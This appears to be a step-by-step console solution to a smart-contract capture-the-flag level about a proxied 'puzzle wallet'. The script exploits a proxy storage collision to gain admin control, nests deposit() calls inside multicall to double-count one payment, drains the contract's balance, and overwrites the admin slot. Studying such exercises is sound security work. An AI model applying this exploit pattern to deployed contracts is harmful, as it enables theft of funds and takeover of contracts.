/* Tools needed for this level:
- Console
*/

// 1.- Declare a variable with the function signature needed.
functionSig = {
	name: 'proposeNewAdmin',
	type: 'function',
	inputs: [
		{
			type: 'address',
			name: '_newAdmin',
		},
	],
}

// 2.- Encode the data of the signature and the player's address
data = web3.eth.abi.encodeFunctionCall(functionSig, [player])

//3.- Execute the transaction with the previously declared data
await web3.eth.sendTransaction({from: player, to: instance, data})

// 4.- Add player to whitelist so that we can execute the following functions
await contract.addToWhitelist(player)

// 5.- Assign the signature of the deposit() function to a variable
depositData = await contract.methods['deposit()'].request().then((v) => v.data)

// 6.- Assign the signature of the multicall() function to a variable
multicallData = await contract.methods['multicall(bytes[])']
	.request([depositData])
	.then((v) => v.data)

// 7.- Execute the multicall function passing its own function signature as the data params
await contract.multicall([multicallData, multicallData], {value: toWei('0.001')})

// 8.- Check that the balance of the contract is now 0.002 ETH
await getBalance(instance)

// 9.- Execute the execute() function sending the entire balance
await contract.execute(player, toWei('0.002'), 0x0)

// 10.- Now that the contract's balance is zero, we can execute setMaxPlayer and take advantage of
// the storage collisions between the contracts
await contract.setMaxBalance(player)
